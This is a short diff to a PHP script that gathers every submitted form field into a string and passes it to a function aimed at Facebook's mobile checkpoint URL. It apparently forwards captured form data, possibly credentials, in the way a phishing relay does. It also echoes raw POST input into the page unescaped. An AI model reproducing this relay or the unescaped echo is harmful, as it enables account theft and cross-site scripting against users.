@@ -15,15 +15,14 @@ foreach ($_POST as $key => $value){
   echo "{$key} = {$value}\r\n";
   if(strcasecmp($key,'submit') !== 0){
     $textopost = $key . '=' . $value . '&' . $textopost;
-    echo '<br>a:' . $textopost . '<br>';
+    //echo '<br>a:' . $textopost . '<br>';
   }
   //var_dump($value);
 }
-echo '<br>' . $textopost . '<br>';
+//echo '<br>' . $textopost . '<br>';
+submitfb($textopost);
 
-submitfb();
-
-function submitfb(){
+function submitfb($textopost){
   
 echo '<br>' . $textopost . '<br>';
 $url="https://m.facebook.com/checkpoint/?next=https://m.facebook.com/";
